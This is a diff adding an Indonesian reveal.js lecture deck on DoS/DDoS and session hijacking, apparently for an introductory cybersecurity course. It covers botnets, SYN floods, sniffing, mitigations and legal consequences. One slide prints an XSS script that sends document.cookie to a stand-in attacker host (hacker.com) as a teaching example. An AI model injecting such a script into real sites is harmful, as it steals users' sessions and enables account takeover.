@@ -1,0 +1,1032 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pertemuan 10: DoS/DDoS & Session Hijacking</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/reveal.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/theme/black.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;900&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --color-primary: #ff6b6b;
+            --color-secondary: #4ecdc4;
+            --color-accent: #ffe66d;
+            --color-success: #51cf66;
+            --color-warning: #ff922b;
+            --color-danger: #ff6b6b;
+            --color-dark: #1a1a2e;
+            --color-light: #f8f9fa;
+        }
+
+        .reveal {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+
+        .reveal h1, .reveal h2, .reveal h3, .reveal h4 {
+            font-family: 'Poppins', sans-serif;
+            text-transform: none;
+            font-weight: 700;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .reveal h1 {
+            font-size: 3em;
+            line-height: 1.2;
+            margin-bottom: 0.5em;
+        }
+
+        .reveal h2 {
+            font-size: 2.2em;
+            color: var(--color-accent);
+        }
+
+        .reveal h3 {
+            font-size: 1.6em;
+            color: var(--color-secondary);
+        }
+
+        .reveal section {
+            text-align: left;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .reveal .centered {
+            text-align: center;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Slide khusus */
+        .title-slide {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 2em;
+        }
+
+        .title-slide h1 {
+            font-size: 3.5em;
+            color: white;
+            margin-bottom: 0.3em;
+            animation: fadeInUp 1s ease-out;
+        }
+
+        .title-slide .subtitle {
+            font-size: 1.4em;
+            color: var(--color-accent);
+            font-weight: 400;
+            animation: fadeInUp 1s ease-out 0.3s both;
+        }
+
+        .title-slide .meta {
+            margin-top: 2em;
+            font-size: 1em;
+            opacity: 0.9;
+            animation: fadeInUp 1s ease-out 0.6s both;
+        }
+
+        /* Card styles */
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 2em;
+            margin: 1em 0;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            transition: transform 0.3s ease;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+        }
+
+        /* Analogy boxes */
+        .analogy {
+            background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
+            color: #1a1a2e;
+            padding: 1.5em;
+            border-radius: 15px;
+            margin: 1em 0;
+            font-size: 1.1em;
+            font-weight: 500;
+            box-shadow: 0 4px 15px rgba(250, 112, 154, 0.4);
+        }
+
+        .analogy::before {
+            content: "💡 Analogi: ";
+            font-weight: 700;
+            font-size: 1.2em;
+        }
+
+        /* Comparison boxes */
+        .comparison {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2em;
+            margin: 1.5em 0;
+        }
+
+        .comparison-item {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 1.5em;
+            border-radius: 15px;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .comparison-item h4 {
+            color: var(--color-accent);
+            margin-bottom: 0.5em;
+            font-size: 1.3em;
+        }
+
+        /* Icon styles */
+        .icon-large {
+            font-size: 4em;
+            margin: 0.3em 0;
+        }
+
+        /* Warning box */
+        .warning {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
+            padding: 1.5em;
+            border-radius: 15px;
+            border-left: 5px solid #c92a2a;
+            margin: 1em 0;
+        }
+
+        .warning::before {
+            content: "⚠️ Penting: ";
+            font-weight: 700;
+            font-size: 1.2em;
+        }
+
+        /* Success box */
+        .success {
+            background: linear-gradient(135deg, #51cf66 0%, #37b24d 100%);
+            padding: 1.5em;
+            border-radius: 15px;
+            border-left: 5px solid #2b8a3e;
+            margin: 1em 0;
+        }
+
+        .success::before {
+            content: "✅ Solusi: ";
+            font-weight: 700;
+            font-size: 1.2em;
+        }
+
+        /* Attack visualization */
+        .attack-viz {
+            display: flex;
+            align-items: center;
+            justify-content: space-around;
+            margin: 2em 0;
+            gap: 1em;
+        }
+
+        .attacker, .target {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 1.5em;
+            border-radius: 50%;
+            text-align: center;
+            font-size: 3em;
+        }
+
+        .attacker {
+            border: 3px solid var(--color-danger);
+        }
+
+        .target {
+            border: 3px solid var(--color-secondary);
+        }
+
+        .arrow {
+            font-size: 3em;
+            color: var(--color-danger);
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        /* Steps */
+        .steps {
+            counter-reset: step-counter;
+            list-style: none;
+            padding-left: 0;
+        }
+
+        .steps li {
+            counter-increment: step-counter;
+            margin: 1em 0;
+            padding: 1em;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            position: relative;
+            padding-left: 4em;
+        }
+
+        .steps li::before {
+            content: counter(step-counter);
+            position: absolute;
+            left: 1em;
+            top: 50%;
+            transform: translateY(-50%);
+            background: var(--color-accent);
+            color: var(--color-dark);
+            width: 2em;
+            height: 2em;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 1.2em;
+        }
+
+        /* Grid layout for types */
+        .types-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5em;
+            margin: 1.5em 0;
+        }
+
+        .type-card {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 1.5em;
+            border-radius: 15px;
+            text-align: center;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            transition: all 0.3s ease;
+        }
+
+        .type-card:hover {
+            transform: scale(1.05);
+            border-color: var(--color-accent);
+        }
+
+        .type-card .emoji {
+            font-size: 3em;
+            margin-bottom: 0.3em;
+        }
+
+        .type-card h4 {
+            color: var(--color-accent);
+            margin: 0.5em 0;
+        }
+
+        /* Protection layers */
+        .protection-layers {
+            position: relative;
+            height: 400px;
+            margin: 2em 0;
+        }
+
+        .layer {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(255, 255, 255, 0.15);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 15px;
+            padding: 1em 2em;
+            font-weight: 600;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .layer:hover {
+            background: rgba(255, 255, 255, 0.25);
+            transform: translateX(-50%) translateY(-5px);
+        }
+
+        .layer1 { width: 90%; top: 0; z-index: 1; }
+        .layer2 { width: 75%; top: 80px; z-index: 2; }
+        .layer3 { width: 60%; top: 160px; z-index: 3; }
+        .layer4 { width: 45%; top: 240px; z-index: 4; }
+        .layer5 { width: 30%; top: 320px; z-index: 5; background: linear-gradient(135deg, #51cf66 0%, #37b24d 100%); }
+
+        /* Animations */
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.2);
+            }
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+
+        .fragment.highlight-red {
+            color: var(--color-danger);
+        }
+
+        .fragment.highlight-green {
+            color: var(--color-success);
+        }
+
+        /* Highlight text */
+        .highlight {
+            background: linear-gradient(135deg, var(--color-accent) 0%, #ffd43b 100%);
+            color: var(--color-dark);
+            padding: 0.2em 0.5em;
+            border-radius: 5px;
+            font-weight: 600;
+        }
+
+        /* Footer */
+        .reveal .footer {
+            position: absolute;
+            bottom: 1em;
+            left: 1em;
+            font-size: 0.6em;
+            opacity: 0.6;
+        }
+
+        /* List styles */
+        .reveal ul, .reveal ol {
+            line-height: 1.8;
+        }
+
+        .reveal li {
+            margin: 0.5em 0;
+        }
+
+        /* Code styles */
+        .reveal code {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 0.2em 0.5em;
+            border-radius: 5px;
+            font-family: 'Space Mono', monospace;
+            color: var(--color-accent);
+        }
+
+        /* Impact statement */
+        .impact {
+            font-size: 1.8em;
+            font-weight: 700;
+            text-align: center;
+            color: var(--color-accent);
+            margin: 1em 0;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+        }
+
+        /* Statistics */
+        .stat {
+            text-align: center;
+            margin: 1em;
+        }
+
+        .stat-number {
+            font-size: 4em;
+            font-weight: 900;
+            color: var(--color-accent);
+            line-height: 1;
+        }
+
+        .stat-label {
+            font-size: 1.2em;
+            opacity: 0.9;
+            margin-top: 0.3em;
+        }
+    </style>
+</head>
+<body>
+    <div class="reveal">
+        <div class="slides">
+            
+            <!-- Slide 1: Title -->
+            <section class="title-slide centered" data-background-gradient="linear-gradient(135deg, #667eea 0%, #764ba2 100%)">
+                <h1>Denial of Service & Session Hijacking</h1>
+                <p class="subtitle">Memahami Serangan yang Melumpuhkan dan Membajak</p>
+                <div class="meta">
+                    <p><strong>Pertemuan 10</strong> | Pengantar Keamanan Siber</p>
+                    <p>Universitas Pertahanan RI</p>
+                </div>
+            </section>
+
+            <!-- Slide 2: Tujuan Pembelajaran -->
+            <section>
+                <h2>🎯 Apa yang Akan Kita Pelajari?</h2>
+                <div class="card">
+                    <ul class="steps">
+                        <li>Memahami serangan yang membuat website <span class="highlight">tidak bisa diakses</span></li>
+                        <li>Mengenal perbedaan <span class="highlight">DoS</span> dan <span class="highlight">DDoS</span></li>
+                        <li>Memahami bagaimana penyerang <span class="highlight">membajak session</span> pengguna</li>
+                        <li>Belajar cara <span class="highlight">melindungi</span> sistem dari serangan ini</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- BAGIAN 1: DENIAL OF SERVICE -->
+            <section class="centered" data-background-gradient="linear-gradient(135deg, #fa709a 0%, #fee140 100%)">
+                <h1 style="font-size: 4em; color: #1a1a2e;">⚠️</h1>
+                <h1 style="color: #1a1a2e;">BAGIAN 1</h1>
+                <h2 style="color: #1a1a2e;">Denial of Service (DoS)</h2>
+                <p style="color: #1a1a2e; font-size: 1.3em;">Serangan yang Melumpuhkan Layanan</p>
+            </section>
+
+            <!-- Slide 3: Apa itu DoS? -->
+            <section>
+                <h2>Apa itu Denial of Service?</h2>
+                <div class="analogy">
+                    Bayangkan restoran kecil dengan 10 meja. Tiba-tiba 100 orang datang bersamaan dan duduk tanpa memesan. Pelanggan asli tidak bisa masuk!
+                </div>
+                <div class="card">
+                    <p style="font-size: 1.3em; margin-top: 1em;"><strong>DoS = Denial of Service</strong></p>
+                    <p style="font-size: 1.1em;">Serangan yang bertujuan membuat <span class="highlight">layanan tidak tersedia</span> untuk pengguna yang sah</p>
+                </div>
+            </section>
+
+            <!-- Slide 4: Visualisasi DoS -->
+            <section>
+                <h2>Bagaimana DoS Bekerja?</h2>
+                <div class="attack-viz">
+                    <div class="attacker">
+                        😈
+                        <p style="font-size: 0.4em;">Penyerang</p>
+                    </div>
+                    <div class="arrow">➡️</div>
+                    <div class="target" style="animation: shake 0.5s infinite;">
+                        🖥️
+                        <p style="font-size: 0.4em;">Server Target</p>
+                    </div>
+                </div>
+                <div class="card">
+                    <p style="text-align: center; font-size: 1.2em;">Penyerang mengirim <span class="highlight">permintaan dalam jumlah BESAR</span></p>
+                    <p style="text-align: center; font-size: 1.2em;">Server <span class="highlight-red">kewalahan</span> dan tidak bisa melayani pengguna normal</p>
+                </div>
+            </section>
+
+            <!-- Slide 5: DoS vs DDoS -->
+            <section>
+                <h2>DoS vs DDoS: Apa Bedanya?</h2>
+                <div class="comparison">
+                    <div class="comparison-item">
+                        <h4>DoS (Denial of Service)</h4>
+                        <div style="text-align: center; font-size: 3em; margin: 0.5em 0;">😈 ➡️ 🖥️</div>
+                        <ul style="font-size: 0.9em;">
+                            <li><strong>Satu</strong> penyerang</li>
+                            <li><strong>Satu</strong> komputer</li>
+                            <li>Mudah diblokir</li>
+                            <li>Kekuatan terbatas</li>
+                        </ul>
+                    </div>
+                    <div class="comparison-item">
+                        <h4>DDoS (Distributed DoS)</h4>
+                        <div style="text-align: center; font-size: 3em; margin: 0.5em 0;">😈 ➡️ 🤖🤖🤖 ➡️ 🖥️</div>
+                        <ul style="font-size: 0.9em;">
+                            <li><strong>Ribuan</strong> komputer</li>
+                            <li>Menggunakan <span class="highlight">botnet</span></li>
+                            <li>Sangat sulit diblokir</li>
+                            <li>Kekuatan MASIF</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Slide 6: Analogi DDoS -->
+            <section>
+                <h2>Analogi DDoS yang Mudah</h2>
+                <div class="analogy">
+                    1 orang mendorong pintu = mudah ditahan<br>
+                    100 orang mendorong pintu secara bersamaan = PINTU JEBOL! 💥
+                </div>
+                <div class="card">
+                    <div class="stat">
+                        <div class="stat-number">1,000,000+</div>
+                        <div class="stat-label">Komputer bisa digunakan dalam 1 serangan DDoS</div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Slide 7: Apa itu Botnet? -->
+            <section>
+                <h2>Apa itu Botnet?</h2>
+                <div class="card">
+                    <p style="font-size: 1.3em;"><strong>Botnet</strong> = Jaringan komputer "zombie" 🧟</p>
+                    <ol class="steps" style="margin-top: 1em;">
+                        <li>Penyerang menyebarkan malware ke banyak komputer</li>
+                        <li>Komputer terinfeksi menjadi "bot" atau "zombie"</li>
+                        <li>Pemilik komputer <span class="highlight">tidak tahu</span> komputernya terinfeksi</li>
+                        <li>Penyerang mengendalikan semua bot dari jarak jauh</li>
+                        <li>Semua bot menyerang target secara bersamaan</li>
+                    </ol>
+                </div>
+            </section>
+
+            <!-- Slide 8: Jenis-jenis Serangan DoS -->
+            <section>
+                <h2>3 Jenis Serangan DoS</h2>
+                <div class="types-grid">
+                    <div class="type-card">
+                        <div class="emoji">💧</div>
+                        <h4>Volumetric</h4>
+                        <p>Membanjiri dengan DATA BESAR</p>
+                        <p style="font-size: 0.8em; opacity: 0.8;">Contoh: UDP Flood, ICMP Flood</p>
+                    </div>
+                    <div class="type-card">
+                        <div class="emoji">🔗</div>
+                        <h4>Protocol</h4>
+                        <p>Eksploitasi KELEMAHAN protokol</p>
+                        <p style="font-size: 0.8em; opacity: 0.8;">Contoh: SYN Flood</p>
+                    </div>
+                    <div class="type-card">
+                        <div class="emoji">⚙️</div>
+                        <h4>Application</h4>
+                        <p>Targetkan APLIKASI web</p>
+                        <p style="font-size: 0.8em; opacity: 0.8;">Contoh: HTTP Flood</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Slide 9: SYN Flood Explained -->
+            <section>
+                <h2>Contoh: SYN Flood Attack</h2>
+                <div class="analogy">
+                    Seperti menelepon restoran untuk reservasi, tapi tidak pernah datang. Kalau 1000 orang melakukannya, restoran tidak bisa melayani tamu asli!
+                </div>
+                <div class="card">
+                    <h4 style="color: var(--color-accent);">Cara Kerja:</h4>
+                    <ol style="font-size: 0.95em;">
+                        <li>Penyerang kirim banyak permintaan "SYN" (minta koneksi)</li>
+                        <li>Server kirim "SYN-ACK" (OK, silakan lanjut)</li>
+                        <li>Penyerang <span class="highlight">TIDAK merespons</span></li>
+                        <li>Server menunggu dan menunggu...</li>
+                        <li>Memori server penuh dengan koneksi "menggantung"</li>
+                    </ol>
+                </div>
+            </section>
+
+            <!-- Slide 10: Dampak DoS/DDoS -->
+            <section>
+                <h2>Dampak Serangan DoS/DDoS</h2>
+                <div class="warning">
+                    Kerugian bisa mencapai MILIARAN rupiah!
+                </div>
+                <div class="types-grid">
+                    <div class="type-card">
+                        <div class="emoji">💰</div>
+                        <h4>Finansial</h4>
+                        <p>Kehilangan revenue</p>
+                        <p>Biaya recovery</p>
+                    </div>
+                    <div class="type-card">
+                        <div class="emoji">😡</div>
+                        <h4>Reputasi</h4>
+                        <p>Kehilangan kepercayaan</p>
+                        <p>Pelanggan kabur</p>
+                    </div>
+                    <div class="type-card">
+                        <div class="emoji">⏰</div>
+                        <h4>Operasional</h4>
+                        <p>Layanan down</p>
+                        <p>Produktivitas terganggu</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- BAGIAN 2: SESSION HIJACKING -->
+            <section class="centered" data-background-gradient="linear-gradient(135deg, #4facfe 0%, #00f2fe 100%)">
+                <h1 style="font-size: 4em; color: #1a1a2e;">🔐</h1>
+                <h1 style="color: #1a1a2e;">BAGIAN 2</h1>
+                <h2 style="color: #1a1a2e;">Session Hijacking</h2>
+                <p style="color: #1a1a2e; font-size: 1.3em;">Membajak Identitas Digital Anda</p>
+            </section>
+
+            <!-- Slide 11: Apa itu Session? -->
+            <section>
+                <h2>Apa itu "Session"?</h2>
+                <div class="analogy">
+                    Seperti tiket masuk perpustakaan. Anda tunjukkan kartu anggota saat masuk, dapat tiket. Setelah itu, cukup tunjukkan tiket untuk akses semua area. Tidak perlu tunjukkan kartu lagi.
+                </div>
+                <div class="card">
+                    <p style="font-size: 1.2em;"><strong>Session</strong> = "Ingatan" website tentang siapa Anda</p>
+                    <ul style="margin-top: 1em;">
+                        <li>Anda login sekali ➡️ dapat <span class="highlight">Session ID</span></li>
+                        <li>Session ID disimpan di browser (cookie)</li>
+                        <li>Setiap request otomatis kirim Session ID</li>
+                        <li>Server tahu "Oh ini si Fulan yang tadi login"</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Slide 12: Apa itu Session Hijacking? -->
+            <section>
+                <h2>Session Hijacking = Mencuri "Tiket" Anda</h2>
+                <div class="attack-viz">
+                    <div style="text-align: center;">
+                        <div style="font-size: 3em;">👤</div>
+                        <p>Anda (korban)</p>
+                        <p style="font-size: 0.8em; color: var(--color-success);">Session ID: ABC123</p>
+                    </div>
+                    <div style="text-align: center;">
+                        <div style="font-size: 3em;">👁️</div>
+                        <p>Penyerang</p>
+                        <p style="font-size: 0.8em; color: var(--color-danger);">Menyadap & mencuri!</p>
+                    </div>
+                    <div style="text-align: center;">
+                        <div style="font-size: 3em;">🖥️</div>
+                        <p>Server</p>
+                        <p style="font-size: 0.8em;">Bingung: "Mana yang asli?"</p>
+                    </div>
+                </div>
+                <div class="warning">
+                    Penyerang bisa akses akun Anda TANPA tahu password!
+                </div>
+            </section>
+
+            <!-- Slide 13: Cara-cara Session Hijacking -->
+            <section>
+                <h2>Bagaimana Session Bisa Dibajak?</h2>
+                <div class="types-grid">
+                    <div class="type-card">
+                        <div class="emoji">📡</div>
+                        <h4>Sniffing</h4>
+                        <p>Menyadap WiFi publik</p>
+                    </div>
+                    <div class="type-card">
+                        <div class="emoji">🕷️</div>
+                        <h4>XSS Attack</h4>
+                        <p>Inject script jahat</p>
+                    </div>
+                    <div class="type-card">
+                        <div class="emoji">🎣</div>
+                        <h4>Session Fixation</h4>
+                        <p>Paksa session ID tertentu</p>
+                    </div>
+                    <div class="type-card">
+                        <div class="emoji">🔀</div>
+                        <h4>Man-in-the-Middle</h4>
+                        <p>Berada di tengah komunikasi</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Slide 14: Session Sniffing - Bahaya WiFi Publik -->
+            <section>
+                <h2>Session Sniffing: Bahaya WiFi Publik</h2>
+                <div class="analogy">
+                    WiFi publik seperti bicara dengan pengeras suara. SEMUA ORANG bisa dengar!
+                </div>
+                <div class="card">
+                    <h4 style="color: var(--color-accent);">Skenario Serangan:</h4>
+                    <ol style="font-size: 0.95em;">
+                        <li>Anda connect ke WiFi kafe ☕</li>
+                        <li>Buka website bank (tanpa HTTPS)</li>
+                        <li>Penyerang di kafe yang sama menjalankan Wireshark 👁️</li>
+                        <li>Penyerang tangkap Session Cookie Anda</li>
+                        <li>Penyerang bisa login sebagai Anda!</li>
+                    </ol>
+                </div>
+                <div class="warning">
+                    JANGAN akses layanan penting di WiFi publik tanpa VPN atau pastikan HTTPS!
+                </div>
+            </section>
+
+            <!-- Slide 15: XSS untuk Session Hijacking -->
+            <section>
+                <h2>XSS: Inject Script untuk Mencuri Cookie</h2>
+                <div class="card">
+                    <p style="font-size: 1.1em;"><strong>XSS</strong> = Cross-Site Scripting</p>
+                    <p>Penyerang menyuntikkan JavaScript jahat ke website</p>
+                </div>
+                <div style="background: rgba(0,0,0,0.3); padding: 1.5em; border-radius: 10px; margin: 1em 0;">
+                    <code style="font-size: 0.8em; display: block; color: #ffe66d;">
+                        &lt;script&gt;<br>
+                        &nbsp;&nbsp;// Kirim cookie ke server penyerang<br>
+                        &nbsp;&nbsp;document.location='http://hacker.com/steal?cookie='<br>
+                        &nbsp;&nbsp;+ document.cookie;<br>
+                        &lt;/script&gt;
+                    </code>
+                </div>
+                <div class="analogy">
+                    Seperti ada orang yang diam-diam menaruh kamera di ruang ganti untuk mengintip!
+                </div>
+            </section>
+
+            <!-- Slide 16: Dampak Session Hijacking -->
+            <section>
+                <h2>Dampak Session Hijacking</h2>
+                <div class="types-grid">
+                    <div class="type-card">
+                        <div class="emoji">💳</div>
+                        <h4>Banking</h4>
+                        <p>Transfer uang</p>
+                        <p>Curi info rekening</p>
+                    </div>
+                    <div class="type-card">
+                        <div class="emoji">📧</div>
+                        <h4>Email</h4>
+                        <p>Baca email pribadi</p>
+                        <p>Reset password akun lain</p>
+                    </div>
+                    <div class="type-card">
+                        <div class="emoji">🛒</div>
+                        <h4>E-commerce</h4>
+                        <p>Belanja pakai kartu tersimpan</p>
+                        <p>Ubah alamat kirim</p>
+                    </div>
+                    <div class="type-card">
+                        <div class="emoji">📱</div>
+                        <h4>Social Media</h4>
+                        <p>Posting atas nama Anda</p>
+                        <p>Akses pesan pribadi</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- BAGIAN 3: MITIGASI -->
+            <section class="centered" data-background-gradient="linear-gradient(135deg, #43e97b 0%, #38f9d7 100%)">
+                <h1 style="font-size: 4em; color: #1a1a2e;">🛡️</h1>
+                <h1 style="color: #1a1a2e;">BAGIAN 3</h1>
+                <h2 style="color: #1a1a2e;">Cara Melindungi Diri</h2>
+                <p style="color: #1a1a2e; font-size: 1.3em;">Defense in Depth</p>
+            </section>
+
+            <!-- Slide 17: Mitigasi DoS/DDoS -->
+            <section>
+                <h2>Melindungi dari DoS/DDoS</h2>
+                <div class="success">
+                    Gunakan strategi berlapis! (Defense in Depth)
+                </div>
+                <ul class="steps">
+                    <li><strong>Rate Limiting:</strong> Batasi jumlah request per IP</li>
+                    <li><strong>Traffic Filtering:</strong> Blokir traffic mencurigakan</li>
+                    <li><strong>Load Balancing:</strong> Distribusi beban ke banyak server</li>
+                    <li><strong>CDN:</strong> Content Delivery Network untuk caching</li>
+                    <li><strong>DDoS Protection Service:</strong> Cloudflare, Akamai, AWS Shield</li>
+                </ul>
+            </section>
+
+            <!-- Slide 18: Visualisasi Defense in Depth -->
+            <section>
+                <h2>Defense in Depth: Pertahanan Berlapis</h2>
+                <div class="protection-layers">
+                    <div class="layer layer1">
+                        <div style="font-size: 1.5em;">🌐</div>
+                        <div>Network Level: Firewall, Rate Limiting</div>
+                    </div>
+                    <div class="layer layer2">
+                        <div style="font-size: 1.5em;">🔌</div>
+                        <div>Transport Level: SYN Cookies</div>
+                    </div>
+                    <div class="layer layer3">
+                        <div style="font-size: 1.5em;">💻</div>
+                        <div>Application Level: WAF, CAPTCHA</div>
+                    </div>
+                    <div class="layer layer4">
+                        <div style="font-size: 1.5em;">👁️</div>
+                        <div>Monitoring: IDS/IPS</div>
+                    </div>
+                    <div class="layer layer5">
+                        <div style="font-size: 1.5em;">🎯</div>
+                        <div>TARGET TERLINDUNGI</div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Slide 19: Mitigasi Session Hijacking -->
+            <section>
+                <h2>Melindungi dari Session Hijacking</h2>
+                <div class="types-grid">
+                    <div class="type-card">
+                        <div class="emoji">🔒</div>
+                        <h4>HTTPS Everywhere</h4>
+                        <p>Enkripsi SEMUA komunikasi</p>
+                    </div>
+                    <div class="type-card">
+                        <div class="emoji">🍪</div>
+                        <h4>Secure Cookie</h4>
+                        <p>Secure, HttpOnly, SameSite flags</p>
+                    </div>
+                    <div class="type-card">
+                        <div class="emoji">🔄</div>
+                        <h4>Regenerate Session</h4>
+                        <p>Session ID baru setelah login</p>
+                    </div>
+                    <div class="type-card">
+                        <div class="emoji">⏰</div>
+                        <h4>Session Timeout</h4>
+                        <p>Otomatis logout setelah idle</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Slide 20: Tips untuk Pengguna -->
+            <section>
+                <h2>🛡️ Tips Melindungi Diri Sendiri</h2>
+                <div class="card">
+                    <h4 style="color: var(--color-accent);">Untuk Pengguna Biasa:</h4>
+                    <ul style="font-size: 1.1em;">
+                        <li>✅ Gunakan <strong>HTTPS</strong> (ada gembok 🔒 di browser)</li>
+                        <li>✅ Hindari WiFi publik untuk transaksi penting</li>
+                        <li>✅ Gunakan <strong>VPN</strong> jika harus pakai WiFi publik</li>
+                        <li>✅ Logout setelah selesai menggunakan layanan</li>
+                        <li>✅ Aktifkan <strong>2FA/MFA</strong> untuk keamanan ekstra</li>
+                        <li>✅ Periksa URL dengan teliti (hati-hati phishing!)</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Slide 21: Tips untuk Developer -->
+            <section>
+                <h2>🔧 Tips untuk Developer</h2>
+                <div class="card">
+                    <h4 style="color: var(--color-accent);">Best Practices:</h4>
+                    <ul style="font-size: 1em;">
+                        <li>🔒 Implementasi <strong>HTTPS</strong> di seluruh website + <strong>HSTS</strong></li>
+                        <li>🍪 Set cookie dengan <code>Secure; HttpOnly; SameSite=Strict</code></li>
+                        <li>🎲 Generate Session ID dengan <strong>cryptographically secure random</strong></li>
+                        <li>🔄 Regenerate Session ID setelah login berhasil</li>
+                        <li>⏰ Implementasi session timeout (15-30 menit idle)</li>
+                        <li>🧹 Validasi dan sanitize ALL user input (cegah XSS)</li>
+                        <li>🛡️ Gunakan WAF (Web Application Firewall)</li>
+                        <li>📊 Monitor aktivitas mencurigakan (anomaly detection)</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Slide 22: Kapan Serangan Terjadi? -->
+            <section>
+                <h2>⚠️ Kapan Risiko Paling Tinggi?</h2>
+                <div class="types-grid">
+                    <div class="type-card">
+                        <div class="emoji">🛒</div>
+                        <h4>E-commerce</h4>
+                        <p>Saat flash sale atau promo besar</p>
+                    </div>
+                    <div class="type-card">
+                        <div class="emoji">🗳️</div>
+                        <h4>Politik</h4>
+                        <p>Saat pemilu atau event politik</p>
+                    </div>
+                    <div class="type-card">
+                        <div class="emoji">🎮</div>
+                        <h4>Gaming</h4>
+                        <p>Kompetisi e-sports penting</p>
+                    </div>
+                    <div class="type-card">
+                        <div class="emoji">📰</div>
+                        <h4>Media</h4>
+                        <p>Saat breaking news besar</p>
+                    </div>
+                </div>
+                <div class="warning">
+                    Siapkan proteksi SEBELUM terlambat! Prevention is better than cure.
+                </div>
+            </section>
+
+            <!-- Slide 23: Kasus Nyata -->
+            <section>
+                <h2>📰 Kasus Nyata yang Terjadi</h2>
+                <div class="card">
+                    <h4 style="color: var(--color-danger);">Mirai Botnet (2016)</h4>
+                    <ul>
+                        <li>Menginfeksi <span class="highlight">600.000+ perangkat IoT</span></li>
+                        <li>Serangan DDoS mencapai <span class="highlight">1 Tbps</span> (1000 Gbps!)</li>
+                        <li>Melumpuhkan Twitter, Netflix, Reddit, dll</li>
+                        <li>Pelajaran: Keamanan IoT sangat lemah!</li>
+                    </ul>
+                </div>
+                <div class="card" style="margin-top: 1em;">
+                    <h4 style="color: var(--color-danger);">Session Hijacking di Coffee Shop</h4>
+                    <ul>
+                        <li>Penyerang di kafe menggunakan Firesheep (2010)</li>
+                        <li>Mencuri session cookie pengguna WiFi publik</li>
+                        <li>Akses Facebook, Twitter tanpa password</li>
+                        <li>Pelajaran: HTTPS wajib untuk semua halaman!</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Slide 24: Aspek Legal -->
+            <section>
+                <h2>⚖️ Aspek Legal dan Etika</h2>
+                <div class="warning">
+                    <strong>SANGAT PENTING:</strong> Melakukan DoS/DDoS atau Session Hijacking tanpa izin adalah ILEGAL!
+                </div>
+                <div class="card">
+                    <h4 style="color: var(--color-accent);">Konsekuensi Hukum:</h4>
+                    <ul style="font-size: 1em;">
+                        <li>⚖️ Melanggar <strong>UU ITE</strong> di Indonesia</li>
+                        <li>🚔 Dapat dipenjara hingga <span class="highlight">10 tahun</span></li>
+                        <li>💰 Denda hingga <span class="highlight">miliaran rupiah</span></li>
+                        <li>📝 Record criminal yang merusak masa depan</li>
+                    </ul>
+                </div>
+                <div class="success">
+                    ✅ Gunakan pengetahuan ini untuk MELINDUNGI, bukan MENYERANG<br>
+                    ✅ Hanya lakukan testing di lingkungan lab dengan izin eksplisit<br>
+                    ✅ Jadilah ethical hacker, bukan criminal!
+                </div>
+            </section>
+
+            <!-- Slide 25: Key Takeaways -->
+            <section>
+                <h2>🎯 Ringkasan: Yang Perlu Diingat</h2>
+                <div class="card">
+                    <h4 style="color: var(--color-accent);">DoS/DDoS:</h4>
+                    <ul>
+                        <li>✓ Tujuan: Membuat layanan <strong>tidak tersedia</strong></li>
+                        <li>✓ DDoS menggunakan <strong>botnet</strong> dengan ribuan komputer</li>
+                        <li>✓ 3 jenis: <strong>Volumetric, Protocol, Application</strong></li>
